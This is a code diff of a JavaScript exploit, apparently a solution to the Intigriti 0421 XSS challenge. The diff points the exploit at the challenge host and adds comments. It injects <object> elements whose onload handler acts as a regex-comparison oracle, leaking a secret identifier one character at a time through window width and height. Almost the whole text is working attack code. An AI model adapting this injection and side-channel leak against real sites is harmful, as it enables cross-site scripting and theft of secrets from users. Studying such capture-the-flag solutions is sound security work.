@@ -12,15 +12,19 @@
         // The idea is to create an oracle with onSMTH that can be repeated over and over
         // I used <object onload=> that can be repeated over and over because it triggers
         // With every request. When the comparision is true, width++ is called
-        // which increases the width of the injected object. It is inspired by @holme_sec solution
+        // which increases the width of the injected object, and which can be
+        // read through window.innerWidth. Height is used to notify that new 
+        // character was leaked to avoid race condition on threading in Chrome
+        
+        // It is inspired by @holme_sec solution
 
         const alph = "0123456789abcdefghijklmnopqrstuvwxyz~"
         const payload = alph.split('').map(c =>
             `location.hash+/${c}/.source</##/.source+identifier&&++width`
         ).join('&&') + ',++height'
 
-        const thisUrl = location.href.replace('http://', 'http://');
-        const top_url = 'http://localhost:8000/?error=' + encodeURIComponent(
+        const thisUrl = location.href.replace('http://', 'https://');
+        const top_url = 'https://challenge-0421.intigriti.io/?error=' + encodeURIComponent(
             `<object style=width:100% name=x data=${thisUrl}></object><object height=0 width=0 data=` +
             `//${location.host}/empty.html name=lload onload=${payload}></object>`
         );
